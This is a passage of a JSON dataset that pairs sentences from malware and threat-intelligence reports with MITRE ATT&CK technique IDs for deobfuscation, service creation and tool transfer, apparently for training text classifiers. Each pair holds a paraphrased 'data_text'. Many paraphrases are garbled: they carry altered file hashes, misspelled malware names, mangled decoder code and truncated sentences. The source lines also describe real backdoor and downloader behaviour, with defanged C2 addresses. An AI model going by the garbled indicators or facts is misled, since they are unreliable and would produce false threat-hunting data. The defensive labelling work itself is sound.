            "data_text": "The main function calls the subfunction to a specific number that the subfunction uses as a case within the switch statement to obtain the associated string to communicate with C2."
        }
    ],
    "We believe the actor used a cryptor on the payload, as it obtains a filename and script from within its resources and decodes these resources by multiplying each byte by negative one": [
        {
            "tec_id": "T1140",
            "en_text": "We believe the actor used a cryptor on the payload, as it obtains a filename and script from within its resources and decodes these resources by multiplying each byte by negative one",
            "data_text": "We believe that the actor used an encryption device in the payload. Because it decodes these resources by obtaining a filename and script within its resources and multiplying each byte by a negative 1."
        }
    ],
    "The payload then uses the MD5 hash (14331d289e737093994395d3fc412afc) of what appears to be a hardcoded SHA1 hash (B6A75B1EF701710D7AEADE0FE93DE8477F3BD506) as an RC4 key to decrypts the resulting decoded data": [
        {
            "tec_id": "T1140",
            "en_text": "The payload then uses the MD5 hash (14331d289e737093994395d3fc412afc) of what appears to be a hardcoded SHA1 hash (B6A75B1EF701710D7AEADE0FE93DE8477F3BD506) as an RC4 key to decrypts the resulting decoded data",
            "data_text": "The payload then uses an MD5 hash (14331d289e737093999395d3fc412afc) that appears to be a hard-coded SHA1 hash (B6A75B1).Decrypt the decoded data using EF701710D7AAEADE0FE93DE8477F3BD506) as the RC4 key."
        }
    ],
    "The unique strings mainly consist of “Mobile/BADDAD“, “Mobile/7B405” and “E9BC3BD76216AFA560BFB5ACAF5731A3”": [
        {
            "tec_id": "T1140",
            "en_text": "The unique strings mainly consist of “Mobile/BADDAD“, “Mobile/7B405” and “E9BC3BD76216AFA560BFB5ACAF5731A3”",
            "data_text": "The unique string consists primarily of \"Mobile/B\".ADD\", \"Mobile/7B405\" and \"E9BC3\"BD76216AFA560BFB5ACAF5731A3\""
        }
    ],
    "“Knock” also appears in several strings inside the code of SpeakUp": [
        {
            "tec_id": "T1140",
            "en_text": "“Knock” also appears in several strings inside the code of SpeakUp",
            "data_text": "\"Knock\" also appears in several strings within the code of SpeakUp."
        }
    ],
    "Indicators  File  Hash  Description  x.js  3fefa55daeb167931975c22df3eca20a  HOMEFRY, a 64-bit Windows password dumper/cracker  mt.exe  40528e368d323db0ac5c3f5e1efe4889  MURKYTOP, a command-line reconnaissance tool   com4.js  a68bf5fce22e7f1d6f999b7a580ae477  AIRBREAK, a JavaScript-based backdoor which retrieves commands from hidden strings in compromised webpages   Historical Indicators  File  Hash  Description  green.ddd  3eb6f85ac046a96204096ab65bbd3e7e  AIRBREAK, a JavaScript-based backdoor which retrieves commands from hidden strings in compromised webpages  BGij  6e843ef4856336fe3ef4ed27a4c792b1  Beacon, a commercially available backdoor  msresamn.ttf  a9e7539c1ebe857bae6efceefaa9dd16  PHOTO, also reported as Derusbi  1024-aa6a121f98330df2edee6c4391df21ff43a33604  bd9e4c82bf12c4e7a58221fc52fed705  BADFLICK, backdoor that is capable of modifying the file system, generating a reverse shell, and modifying its command-and-control configuration": [
        {
            "tec_id": "T1140",
            "en_text": "Indicators  File  Hash  Description  x.js  3fefa55daeb167931975c22df3eca20a  HOMEFRY, a 64-bit Windows password dumper/cracker  mt.exe  40528e368d323db0ac5c3f5e1efe4889  MURKYTOP, a command-line reconnaissance tool   com4.js  a68bf5fce22e7f1d6f999b7a580ae477  AIRBREAK, a JavaScript-based backdoor which retrieves commands from hidden strings in compromised webpages   Historical Indicators  File  Hash  Description  green.ddd  3eb6f85ac046a96204096ab65bbd3e7e  AIRBREAK, a JavaScript-based backdoor which retrieves commands from hidden strings in compromised webpages  BGij  6e843ef4856336fe3ef4ed27a4c792b1  Beacon, a commercially available backdoor  msresamn.ttf  a9e7539c1ebe857bae6efceefaa9dd16  PHOTO, also reported as Derusbi  1024-aa6a121f98330df2edee6c4391df21ff43a33604  bd9e4c82bf12c4e7a58221fc52fed705  BADFLICK, backdoor that is capable of modifying the file system, generating a reverse shell, and modifying its command-and-control configuration",
            "data_text": "Indicators File Hash Description x.js 3fefa55da167931975c22df3eca20a HOMEFRI, search for 64-bit Windows password dumper/cracker mt.exe 40528e368d3db0ac5f5e1e4889 DOCKTOP, command-line-based comjsa4.jairdobor7807807807Romed Web page Historical Indicators File Hash Description green.dd 3eb6f85ac046a964096ab65bd3e7e AIRBREAK is a JavaScript-based backdoor BGij6e843ef48336ef4fe4274be9 that can be used commercially for retrieving commands from hidden strings of corrupted Web pages. Photo, also Derusbi 1024-aaa121f98330df2edee6c4391df21ff43a33604bd9c82bf12c4e7a58221fc52fed705 Backdoor, where you can modify the file system, create a reverse shell, and modify the command-control configuration"
        }
    ],
    "It maintains both code and data in the raw, encrypted blobs of data to be decrypted and used at runtime, and hidden functionality that isn’t exposed until runtime": [
        {
            "tec_id": "T1140",
            "en_text": "It maintains both code and data in the raw, encrypted blobs of data to be decrypted and used at runtime, and hidden functionality that isn’t exposed until runtime",
            "data_text": "Hidden features that maintain code and data in both raw and encrypted data blocks, decrypting and used at runtime, and not exposed until runtime"
        }
    ],
    "No pdb/debug strings are present in the code": [
        {
            "tec_id": "T1140",
            "en_text": "No pdb/debug strings are present in the code",
            "data_text": "The code does not contain the pdb/debug string."
        }
    ],
    "In total, 29 unique CARROTBAT samples have been identified to date, containing a total of 12 confirmed unique decoy documents": [
        {
            "tec_id": "T1140",
            "en_text": "In total, 29 unique CARROTBAT samples have been identified to date, containing a total of 12 confirmed unique decoy documents",
            "data_text": "So far, a total of 29 unique CARROBAT samples have been identified, with a total of 12 unique identified bait documents."
        }
    ],
    "In this particular instance, the payload is encoded via base64, which certutil decodes": [
        {
            "tec_id": "T1140",
            "en_text": "In this particular instance, the payload is encoded via base64, which certutil decodes",
            "data_text": "In this particular case, the payload is encoded via base64, which is surely decoded."
        }
    ],
    "The following function written in Python may be used to decode this file:def decode(data): \tout = \"\" \tc = 0 \tfor d in data: \t\tout += chr(ord(d)^c) \t\tc+=1 \treturn outOnce decoded it is discovered that this instance of OceanSalt attempts to communicate with 61.14.210[.]72 on port 7117": [
        {
            "tec_id": "T1140",
            "en_text": "The following function written in Python may be used to decode this file:def decode(data): \tout = \"\" \tc = 0 \tfor d in data: \t\tout += chr(ord(d)^c) \t\tc+=1 \treturn outOnce decoded it is discovered that this instance of OceanSalt attempts to communicate with 61.14.210[.]72 on port 7117",
            "data_text": "A function written in Python can be used to decode this file: def decode(data): ut = \" = 0 or d in data: ut + = chr(ord(d)^c) + = 1 returnout Once decoded, this OceanSalt instance was found to attempt to communicate with port 7117."
        }
    ],
    "The following code example shows the false flag being set (5 > 115) and the ETransaksi.diomadnfagaghagh method being called:  int num = 5; int num2 = 155; bool flag = num > num2; if (flag) {     <legitimate Sales System Application code>     }            else {     NewLateBinding.LateCall(ETransaksi.diomadnfagaghagh(), null, \"Invoke\", new object[]     {         null,         new object[0]     }, null, null, null, true);The payload uses this technique to run a chain of methods that eventually carry out its malicious task": [],
    "(Source: Dell SecureWorks) Both the redirect code on the compromised site and the exploit code appear and disappear, indicating that the adversaries add the code when they want to leverage the SWC and remove the code when it is not in use to limit the visibility of their operations": [
        {
            "tec_id": "T1140",
            "en_text": "(Source: Dell SecureWorks) Both the redirect code on the compromised site and the exploit code appear and disappear, indicating that the adversaries add the code when they want to leverage the SWC and remove the code when it is not in use to limit the visibility of their operations",
            "data_text": "(Source: Dell SecureWorks) By appearing and disappearing both the redirect code and the exploit code at a compromised site, an attacker adds code when trying to leverage SWC and removes code when not in use, limiting operational visibility."
        }
    ],
    "The decrypted contents of the log file adhere to the format in Figure 22": [
        {
            "tec_id": "T1140",
            "en_text": "The decrypted contents of the log file adhere to the format in Figure 22",
            "data_text": "The decrypted content of the log file follows the format shown in Figure 22."
        }
    ],
    "Decrypted OwaAuth log file format": [
        {
            "tec_id": "T1140",
            "en_text": "Decrypted OwaAuth log file format",
            "data_text": "Decrypted OwaAuth log file format"
        }
    ],
    "The backdoor will load the encrypted configuration file and decrypt it, then use Secure Sockets Layer (SSL) protocol to connect to command-and-control (C&C) servers": [
        {
            "tec_id": "T1140",
            "en_text": "The backdoor will load the encrypted configuration file and decrypt it, then use Secure Sockets Layer (SSL) protocol to connect to command-and-control (C&C) servers",
            "data_text": "The backdoor loads the encrypted configuration file, deciphers the password, and connects to the command and control (C) using the Secure Sockets Layer (SSL) protocol."
        }
    ],
    "Malicious document used by Tropic Trooper PDB Strings as Context Clues The MSI file has two program database (PDB) strings inside: one belonging to the MSI file, and another for the backdoor installer (detected by Trend Micro as TROJ_TCDROP.ZTFB)": [
        {
            "tec_id": "T1140",
            "en_text": "Malicious document used by Tropic Trooper PDB Strings as Context Clues The MSI file has two program database (PDB) strings inside: one belonging to the MSI file, and another for the backdoor installer (detected by Trend Micro as TROJ_TCDROP.ZTFB)",
            "data_text": "A malicious document MSI file that the TropicTrooper PDB string uses as a context clue has two program database (PDB) strings. One belongs to the MSI file and the other string for the backdoor installer (detected by TROJ_TCDROP.Z in Trend Micro).TFB)"
        }
    ],
    "The image and table below illustrate TClient’s encrypted configuration that we decrypted (via Python code):  Figure 10": [
        {
            "tec_id": "T1140",
            "en_text": "The image and table below illustrate TClient’s encrypted configuration that we decrypted (via Python code):  Figure 10",
            "data_text": "The images and tables below show the encrypted configuration of the TClient decrypted via Python code. Figure 10"
        }
    ],
    "Snapshot of code we used to decrypt TClient’s configuration   Figure 11": [
        {
            "tec_id": "T1140",
            "en_text": "Snapshot of code we used to decrypt TClient’s configuration   Figure 11",
            "data_text": "Snapshot Figure 11 of the code used to decrypt the Tclient configuration"
        }
    ],
    "Decrypted backdoor configuration Reverse analysis of TClient allowed us to determine how to decrypt the C&C information": [
        {
            "tec_id": "T1140",
            "en_text": "Decrypted backdoor configuration Reverse analysis of TClient allowed us to determine how to decrypt the C&C information",
            "data_text": "The reverse analysis of the decrypted backdoor configuration Tclient allowed us to determine how to decrypt C."
        }
    ],
    "Create Service": [
        {
            "tec_id": "T1543",
            "en_text": "Create Service",
            "data_text": "Creating a Service"
        }
    ],
    "Further collaboration between FireEye as a Service (FaaS), Mandiant and FireEye iSIGHT intelligence uncovered additional victims worldwide, a new suite of tools and novel techniques": [
        {
            "tec_id": "T1543",
            "en_text": "Further collaboration between FireEye as a Service (FaaS), Mandiant and FireEye iSIGHT intelligence uncovered additional victims worldwide, a new suite of tools and novel techniques",
            "data_text": "Additional collaboration between FireEye as a Service (FaaS), Maniant, and FireEyiSIGHT intelligence has uncovered additional victims, a new suite of tools and technologies worldwide."
        }
    ],
    "In addition, web traffic between a service provider’s customer and a service provider is likely to be viewed as benign by network defenders at the customer, allowing the attacker to exfiltrate data stealthily": [
        {
            "tec_id": "T1543",
            "en_text": "In addition, web traffic between a service provider’s customer and a service provider is likely to be viewed as benign by network defenders at the customer, allowing the attacker to exfiltrate data stealthily",
            "data_text": "In addition, web traffic between service provider customers and service providers is likely to be considered harmless by network guardians, which can lead to an attacker leaking data secretly."
        }
    ],
    "This effectively routes SOGU malware traffic through the victim’s service provider, which likely indicates a foothold on the service provider’s network": [
        {
            "tec_id": "T1543",
            "en_text": "This effectively routes SOGU malware traffic through the victim’s service provider, which likely indicates a foothold on the service provider’s network",
            "data_text": "This effectively routes SOGU malware traffic through the victim's service provider, indicating that there is a foothold in the service provider's network."
        }
    ],
    "These parameters install it as a service": [
        {
            "tec_id": "T1543",
            "en_text": "These parameters install it as a service",
            "data_text": "Install these parameters as a service."
        }
    ],
    "The malware operates on victims’ systems as a svchost-based service and is capable of downloading executables, changing its own configuration, updating its own binaries, terminating its own processes, and activating and terminating denial-of-service attacks": [
        {
            "tec_id": "T1543",
            "en_text": "The malware operates on victims’ systems as a svchost-based service and is capable of downloading executables, changing its own configuration, updating its own binaries, terminating its own processes, and activating and terminating denial-of-service attacks",
            "data_text": "Malware operates as svchost-based services on the victim's system, allowing executable file downloads, self-configuration changes, self-binary updates, self-process termination, and denial-of-service attacks to be activated and terminated."
        }
    ],
    "The malicious DLL is not a service DLL because it lacks ServiceMain()": [
        {
            "tec_id": "T1543",
            "en_text": "The malicious DLL is not a service DLL because it lacks ServiceMain()",
            "data_text": "Malicious DLLs are not service DLLs because they do not have ServiceMain()."
        }
    ],
    "The victims Data from Cadelle’s C&C servers shows that a large number of Backdoor.Cadelspy infections affected individual users of Iranian internet service providers (ISPs) and hosting services": [
        {
            "tec_id": "T1543",
            "en_text": "The victims Data from Cadelle’s C&C servers shows that a large number of Backdoor.Cadelspy infections affected individual users of Iranian internet service providers (ISPs) and hosting services",
            "data_text": "Victim data from Cardell's C"
        }
    ],
    "\"Are you Happy?\" campaign.\"FreeMilk\" campaign.\"North Korean Human Rights\" campaign.\"Evil New Year 2018\" campaign.On January 2nd of 2018, the \"Evil New Year 2018\" was started": [
        {
            "tec_id": "T1543",
            "en_text": "\"Are you Happy?\" campaign.\"FreeMilk\" campaign.\"North Korean Human Rights\" campaign.\"Evil New Year 2018\" campaign.On January 2nd of 2018, the \"Evil New Year 2018\" was started",
            "data_text": "'Are you happy?' Campaign 'Free Milk' Campaign 'North Korean Human Rights' Campaign 'Evil New Year 2018' Campaign.On January 2, 2018, Evil New Year 2018 began."
        }
    ],
    "The document brought Talos a new gift - a new version of ROKRAT": [
        {
            "tec_id": "T1543",
            "en_text": "The document brought Talos a new gift - a new version of ROKRAT",
            "data_text": "This document brought a new version of ROKRAT, a new gift for Talos."
        }
    ],
    "Figure 2: AuditCred/ROptimizer Service If successfully installed, this particular backdoor poses quite a threat to its target": [
        {
            "tec_id": "T1543",
            "en_text": "Figure 2: AuditCred/ROptimizer Service If successfully installed, this particular backdoor poses quite a threat to its target",
            "data_text": "Figure 2: AuditCred/ROPtimizer service If this backdoor is installed successfully, it poses a significant threat to the target."
        }
    ],
    "BootComplete starts the AutoStartup service and the AutoStartup service makes sure that MainActivity is always running": [
        {
            "tec_id": "T1543",
            "en_text": "BootComplete starts the AutoStartup service and the AutoStartup service makes sure that MainActivity is always running",
            "data_text": "BootComplete starts the AutoStartup service and the AutoStartup service verifies that MainActivity is always running."
        }
    ],
    "HAYMAKER is a backdoor that can download and execute additional payloads in the form of modules": [
        {
            "tec_id": "T1105",
            "en_text": "HAYMAKER is a backdoor that can download and execute additional payloads in the form of modules",
            "data_text": "HAYMAKER is a backdoor that allows you to download and execute additional payloads in the form of modules."
        }
    ],
    "It downloads the file to the infected machine from the input URL using BITSAdmin, and is called every time the script attempts to download a file": [
        {
            "tec_id": "T1105",
            "en_text": "It downloads the file to the infected machine from the input URL using BITSAdmin, and is called every time the script attempts to download a file",
            "data_text": "Called whenever a file is downloaded from an input URL to an infected system using BITSAdmin and the script attempts to download the file."
        }
    ],
    "The XSL script contains additional hard coded variables sVarRaz and sVar2RazX, which contain file paths that direct to the downloaded files.   The file’s path": [
        {
            "tec_id": "T1105",
            "en_text": "The XSL script contains additional hard coded variables sVarRaz and sVar2RazX, which contain file paths that direct to the downloaded files.   The file’s path",
            "data_text": "The XSL script contains additional hard code variables sVarRaz and sVar2RazX that contain the file path to the downloaded file. File path"
        }
    ],
    "The directory creation.  Downloading the Payloads The remote XSL script downloads twelve files from the C2 server that masquerade themselves as JPEG, GIF, and extensionless files": [
        {
            "tec_id": "T1105",
            "en_text": "The directory creation.  Downloading the Payloads The remote XSL script downloads twelve files from the C2 server that masquerade themselves as JPEG, GIF, and extensionless files",
            "data_text": "Create a directory. The payload download remote XSL script downloads 12 files from the C2 server that pretend to be JPEG, GIF, and extension-free files."
        }
    ],
    "A thorough explanation of what information is collected can be found in a breakdown by Cofense from late 2018.   The script verifies all parts of the malware have been downloaded.  After downloading the payload, the XSL script checks to make sure every piece of the malware was downloaded.   One of the twelve download commands as detected by the Cybereason platform in same variant of Astaroth.   The twelve downloaded files": [
        {
            "tec_id": "T1105",
            "en_text": "A thorough explanation of what information is collected can be found in a breakdown by Cofense from late 2018.   The script verifies all parts of the malware have been downloaded.  After downloading the payload, the XSL script checks to make sure every piece of the malware was downloaded.   One of the twelve download commands as detected by the Cybereason platform in same variant of Astaroth.   The twelve downloaded files",
            "data_text": "A thorough explanation of what information is collected can be found in Copens' analysis from the end of 2018. This script verifies that all parts of the malware have been downloaded. After downloading the payload, the XSL script verifies that all malware has been downloaded. One of 12 download commands detected on the Cybreason platform of the same variant Astaros. 12 downloaded files"
        }
    ],
    "The config file provides download instructions for the loader": [
        {
            "tec_id": "T1105",
            "en_text": "The config file provides download instructions for the loader",
            "data_text": "The configuration file provides download instructions for the loader."
        }
    ],
    "Displayed below are these new, xml formatted plugin names “weap_hwi”, “ps”, and “vsnet” in a BlackEnergy configuration file download from a c2 server": [
        {
            "tec_id": "T1105",
            "en_text": "Displayed below are these new, xml formatted plugin names “weap_hwi”, “ps”, and “vsnet” in a BlackEnergy configuration file download from a c2 server",
            "data_text": "Below you will see the new plug-in names \"weap_hwi\", \"ps\", and \"vsnet\" in xml format in the BlackEnergy configuration file downloaded from the c2 server."
        }
    ],
    "One of the discovered config files contained a URL with an as yet unidentified md5: hxxps://46.165.222(dot)28/upgrade/bf0dac805798cc1f633f19ce8ed6382f/upgrade.php Victim set #4 A set of victims discovered installed Siemens SCADA software in their ICS environment was responsible for downloading and executing BlackEnergy": [
        {
            "tec_id": "T1105",
            "en_text": "One of the discovered config files contained a URL with an as yet unidentified md5: hxxps://46.165.222(dot)28/upgrade/bf0dac805798cc1f633f19ce8ed6382f/upgrade.php Victim set #4 A set of victims discovered installed Siemens SCADA software in their ICS environment was responsible for downloading and executing BlackEnergy",
            "data_text": "One of the configuration files found contains a URL containing an unverified md5. hxxps://46.165.222(dot)28/upgrade/bf0dac805798cc1f19ce8ed6382f/upgrade.php Victim Set #4 Siemens SCADA software installed in ICS environment is the victim set responsible for black energy execution."
        }
    ],
    "HighShell v5.0 explorer tab allows actor to navigate the file system The HighShell v7.1 variant from the data dump contains similar functionality to its predecessors and continued the tabular approach but expanded even further by splitting out the main functionality across multiple tabs, specifically “Command”, “Explorer”, “Upload”, “Download”, “Sql Server” and “Change Time”": [
        {
            "tec_id": "T1105",
            "en_text": "HighShell v5.0 explorer tab allows actor to navigate the file system The HighShell v7.1 variant from the data dump contains similar functionality to its predecessors and continued the tabular approach but expanded even further by splitting out the main functionality across multiple tabs, specifically “Command”, “Explorer”, “Upload”, “Download”, “Sql Server” and “Change Time”",
            "data_text": "The HighShell v5.0 Explorer tab enables workers to navigate the file system. The HighShell v7.1 variant of the data dump includes features similar to previous versions and continued its tabular approach, but was further expanded by dividing key features into several tabs, such as \"command\", \"explorer\", \"upload\", \"download\", and \"Sq\".l Server\" and \"Change Time\""
        }
    ],
    "Network Downloader The Network Downloader functionality allows the actor to quickly upload user files from remote victim systems": [
        {
            "tec_id": "T1105",
            "en_text": "Network Downloader The Network Downloader functionality allows the actor to quickly upload user files from remote victim systems",
            "data_text": "The Network Downloader Network Downloader feature allows workers to quickly upload user files from remote victim computers."
        }
    ],
    "The sample, in the form of an RTF document, exploited CVE-2016-4117 to download and install a program from a remote C&C server": [
        {
            "tec_id": "T1105",
            "en_text": "The sample, in the form of an RTF document, exploited CVE-2016-4117 to download and install a program from a remote C&C server",
            "data_text": "Samples in the form of RTF documents were downloaded and installed from remote C using CVE-2016-4117."
        }
    ],
    "Symantec determined a more accurate picture of Buckeye’s targets by looking at where Buckeye remained active on the network longer than a day, deployed additional tools, and spread onto multiple computers": [
        {
            "tec_id": "T1105",
            "en_text": "Symantec determined a more accurate picture of Buckeye’s targets by looking at where Buckeye remained active on the network longer than a day, deployed additional tools, and spread onto multiple computers",
            "data_text": "Symantec identified a more accurate picture of Buckeye's targets by keeping him active for more than a day on the network, deploying additional tools, and locating them distributed across multiple computers."
        }
    ],
    "The BITS mechanism has existed since Windows XP up to the current Windows 10 versions and was developed to create download/upload jobs, mostly to update the OS itself": [
        {
            "tec_id": "T1105",
            "en_text": "The BITS mechanism has existed since Windows XP up to the current Windows 10 versions and was developed to create download/upload jobs, mostly to update the OS itself",
            "data_text": "The BITS mechanism existed from Windows XP to the current version of Windows 10 and was developed to generate download/upload operations."
        }
    ],
    "It uses the Dropbox API with a hardcoded bearer access token and has the ability to download, upload, and execute files": [
        {
            "tec_id": "T1105",
            "en_text": "It uses the Dropbox API with a hardcoded bearer access token and has the ability to download, upload, and execute files",
            "data_text": "Use the Dropbox API with hard-coded bearer access tokens to download, upload, and run files."
        }
    ],
    "Using this information, they can decide to explore further or instruct the compromised computer to download additional malware": [
        {
            "tec_id": "T1105",
            "en_text": "Using this information, they can decide to explore further or instruct the compromised computer to download additional malware",
            "data_text": "You can use this information to determine additional navigation or to instruct a damaged computer to download additional malware."
        }
    ],
    "In this case, after the payload is delivered via an exploit the threat actor places files (named upload.bat, upload.rar, and period.txt, download.txt or silent.txt) in a directory on a Dropbox account": [
        {
            "tec_id": "T1105",
            "en_text": "In this case, after the payload is delivered via an exploit the threat actor places files (named upload.bat, upload.rar, and period.txt, download.txt or silent.txt) in a directory on a Dropbox account",
            "data_text": "In this case, after the payload is passed through the threat, the actor places the files (upload.bat, upload.rar, and period).txt, download it.txt or silent.txt) in the directory of the dropbox account"
        }
    ],
    "Upon execution, the initialized file downloads multiple malicious payloads from remote servers": [
        {
            "tec_id": "T1105",
            "en_text": "Upon execution, the initialized file downloads multiple malicious payloads from remote servers",
            "data_text": "Files initialized at runtime download multiple malicious payloads from the remote server."
        }
    ],
    "Figure 4 Microsoft Word attempting to download the remote template If the C2 server is active at the time the document is opened, it will successfully retrieve the malicious macro and load it in the same Microsoft Word session": [
        {
            "tec_id": "T1105",
            "en_text": "Figure 4 Microsoft Word attempting to download the remote template If the C2 server is active at the time the document is opened, it will successfully retrieve the malicious macro and load it in the same Microsoft Word session",
            "data_text": "Figure 4 If the C2 server is active when you open a Microsoft Word document that you want to download a remote template, successfully scan for malicious macros and load them into the same Microsoft Word session."
        }
    ],
    "If the C2 server is not active at this time, the download will fail and the victim will not receive a prompt to Enable Content as no macro is downloaded": [
        {
            "tec_id": "T1105",
            "en_text": "If the C2 server is not active at this time, the download will fail and the victim will not receive a prompt to Enable Content as no macro is downloaded",
            "data_text": "If the C2 server is not currently active, the download fails and the macro is not downloaded, so the victim is not prompted to activate the content."
        }
    ],
    "attachedTemplate.dotm xxx 11/15/18 05:35 11/15/18 05:35 109.248.148[.]42    Table 2 Remote templates downloaded by Dear Joohn delivery documents As seen in Table 1, the delivery documents accessed their respective remote templates from four C2 servers at the following IP addresses:  185.203.118[.]198 145.249.105[.]165 188.241.58[.]170  109.248.148[.]42  These initial C2 IP addresses not only hosted the remote templates that subsequently load the first-stage Zebrocy or Cannon payloads, but the IP addresses also hosted the C2 server for the first-stage payloads themselves": [],
    "The POSHSPY backdoor is designed to download and execute additional PowerShell code and Windows binaries": [
        {
            "tec_id": "T1105",
            "en_text": "The POSHSPY backdoor is designed to download and execute additional PowerShell code and Windows binaries",
            "data_text": "The POSHSPY backdoor is designed to download and run additional PowerShell codes and Windows binaries."
        }
    ],
    "If the user clicks on the link, he will be prompted to download a RAR file that contains the stage 1 malware/lure, which he will execute afterwards": [
        {
            "tec_id": "T1105",
            "en_text": "If the user clicks on the link, he will be prompted to download a RAR file that contains the stage 1 malware/lure, which he will execute afterwards",
            "data_text": "When the user clicks the link, the user is prompted to download a RAR file containing Stage 1 malware/loor, which will run later."
        }
    ],
    "The executable attempts to download a couple of files from different sources and saves them in the AppData and Startup folders for persistence, then invokes the first downloaded file – Picture2.exe": [
        {
            "tec_id": "T1105",
            "en_text": "The executable attempts to download a couple of files from different sources and saves them in the AppData and Startup folders for persistence, then invokes the first downloaded file – Picture2.exe",
            "data_text": "The executable attempts to download several files from different sources, saves them in the AppData and Startup folders for persistence, and then calls the first downloaded file, Picture2.carry out"
        }
    ],
    "The RAT, however, had a multitude of functionalities (as listed in the table below) such as to download and execute, compress, encrypt, upload, search directories, etc": [
        {
            "tec_id": "T1105",
            "en_text": "The RAT, however, had a multitude of functionalities (as listed in the table below) such as to download and execute, compress, encrypt, upload, search directories, etc",
            "data_text": "However, RAT had various functions such as download and run, compression, encryption, upload, and directory search."
        }
    ],
    "The link provided in the malicious email led to a fake VPN Web Portal:  Upon logging in with the credentials provided in the email, the victim is presented with the following page:  The victim is asked to install the “VPN Client” (an .exe file), or, if download fails, to download a password protected zip (with the same .exe file inside)": [
        {
            "tec_id": "T1105",
            "en_text": "The link provided in the malicious email led to a fake VPN Web Portal:  Upon logging in with the credentials provided in the email, the victim is presented with the following page:  The victim is asked to install the “VPN Client” (an .exe file), or, if download fails, to download a password protected zip (with the same .exe file inside)",
            "data_text": "A fake VPN web portal was created due to a link provided in a malicious email. If you log in using the credentials provided in the email, the victim will see the next page. The victim is prompted to install the \"VPN Client (.exe file)\", or download a password-protected zip (which has the same .exe file in it) if the download fails."
        }
    ],
    "This document was alleged to have been written by the Ministry of Reunification as demonstrated by the logo in the top left.Similar to the \"Golden Time\" campaign, this document exploits an EPS vulnerability in order to download and execute shellcode located on a compromised website:hxxp://60chicken[.]co[.]kr/wysiwyg/PEG_temp/logo1.pngThe fake image usage is a common pattern for this group": [],
    "The macro contains malicious code that attempts to download content from a remote server": [
        {
            "tec_id": "T1105",
            "en_text": "The macro contains malicious code that attempts to download content from a remote server",
            "data_text": "The macro contains malicious code that attempts to download content from a remote server."
        }
    ],
    "!DWN  Downloads a file from a specified URL": [
        {
            "tec_id": "T1105",
            "en_text": "!DWN  Downloads a file from a specified URL",
            "data_text": "!DWN Downloads the file from the specified URL."
        }
    ],
    "Responds to the IRC server via PRIVMSG with “Download  Success :FilePath=<path to downloaded file>” or “Download Fail” if unsuccessful": [
        {
            "tec_id": "T1105",
            "en_text": "Responds to the IRC server via PRIVMSG with “Download  Success :FilePath=<path to downloaded file>” or “Download Fail” if unsuccessful",
            "data_text": "Answer the IRC server with \"Download Success:FilePath=\" or \"Download Fail\" via PRIVMSG."
        }
    ],
    "The IRC variant of MPK has a command set (Table 2) that makes this an effective backdoor Trojan, specifically allowing the actors to steal credentials from the targeted system via keylogging, to navigate and interact with the file system, to run arbitrary commands, and to download and execute additional tools on the system": [
        {
            "tec_id": "T1105",
            "en_text": "The IRC variant of MPK has a command set (Table 2) that makes this an effective backdoor Trojan, specifically allowing the actors to steal credentials from the targeted system via keylogging, to navigate and interact with the file system, to run arbitrary commands, and to download and execute additional tools on the system",
            "data_text": "The IRC variant of MPK has a set of instructions (Table 2) that make it an effective backdoor Trojan, particularly allowing actors to steal credentials from target systems, navigate and interact with file systems, execute arbitrary instructions, and download and execute additional tools from the system."
        }
    ],
    "It exploits CVE-2017-0199 to download the second stage payload from 193.23.181.151 (Figure 3)": [
        {
            "tec_id": "T1105",
            "en_text": "It exploits CVE-2017-0199 to download the second stage payload from 193.23.181.151 (Figure 3)",
            "data_text": "Download the Phase 2 payload from 193.23.181.151 using CVE-2017-0199 (Figure 3)."
        }
    ],
    "Figure 4: Downloading second stage Seminar.rtf The downloaded Seminar.rtf contains an embedded binary file that is dropped in %temp% via Equation Editor executable": [
        {
            "tec_id": "T1105",
            "en_text": "Figure 4: Downloading second stage Seminar.rtf The downloaded Seminar.rtf contains an embedded binary file that is dropped in %temp% via Equation Editor executable",
            "data_text": "Figure 4: Stage 2 Seminar.rtf Downloaded Seminar.rtf contains a built-in binary file that is deleted as %temp% via the Equation Editor executable."
        }
    ],
    "Zyklon is a publicly available, full-featured backdoor capable of keylogging, password harvesting, downloading and executing additional plugins, conducting distributed denial-of-service (DDoS) attacks, and self-updating and self-removal": [
        {
            "tec_id": "T1105",
            "en_text": "Zyklon is a publicly available, full-featured backdoor capable of keylogging, password harvesting, downloading and executing additional plugins, conducting distributed denial-of-service (DDoS) attacks, and self-updating and self-removal",
            "data_text": "Zyklon is a public backdoor with all the features of key logging, password collection, downloading and executing additional plug-ins, performing Distributed Denial of Service (DDoS) attacks, self-updating, and self-removal."
        }
    ],
    "The DOC file contains an embedded OLE Object that, upon execution, triggers the download of an additional DOC file from the stored URL (seen in Figure 3)": [
        {
            "tec_id": "T1105",
            "en_text": "The DOC file contains an embedded OLE Object that, upon execution, triggers the download of an additional DOC file from the stored URL (seen in Figure 3)",
            "data_text": "The DOC file contains an OLE object that triggers the download of additional DOC files from the URL stored at runtime (see Figure 3)."
        }
    ],
    "Upon opening the malicious DOC attachment, an additional download is triggered from a stored URL within an embedded OLE Object (seen in Figure 4)": [
        {
            "tec_id": "T1105",
            "en_text": "Upon opening the malicious DOC attachment, an additional download is triggered from a stored URL within an embedded OLE Object (seen in Figure 4)",
            "data_text": "Opening a malicious DOC attachment triggers an additional download from the URL stored within the embedded OLE object (see Figure 4)."
        }
    ],
    "Figure 4: Embedded URL in OLE object    Figure 5: HTTP GET request to download the next level payload The downloaded file, doc.doc, is XML-based and contains a PowerShell command (shown in Figure 6) that subsequently downloads the binary Pause.ps1": [
        {
            "tec_id": "T1105",
            "en_text": "Figure 4: Embedded URL in OLE object    Figure 5: HTTP GET request to download the next level payload The downloaded file, doc.doc, is XML-based and contains a PowerShell command (shown in Figure 6) that subsequently downloads the binary Pause.ps1",
            "data_text": "Figure 4: Built-in URL for OLE objects Figure 5: HTTP GET request for downloading next level payload The downloaded file doc.doc is XML-based and contains PowerShell commands (shown in Figure 6) that later download the Pause.ps1 binary."
        }
    ],
    "Figure 8 shows the network communication of the Pause.ps1 download": [
        {
            "tec_id": "T1105",
            "en_text": "Figure 8 shows the network communication of the Pause.ps1 download",
            "data_text": "Figure 8 shows the network communication of the Pause.ps1 download."
        }
    ],
    "Figure 8: Network communication to download the Pause.ps1 payload Zyklon Delivery In all these techniques, the same domain is used to download the next level payload (Pause.ps1), which is another PowerShell script that is Base64 encoded (as seen in Figure 8)": [
        {
            "tec_id": "T1105",
            "en_text": "Figure 8: Network communication to download the Pause.ps1 payload Zyklon Delivery In all these techniques, the same domain is used to download the next level payload (Pause.ps1), which is another PowerShell script that is Base64 encoded (as seen in Figure 8)",
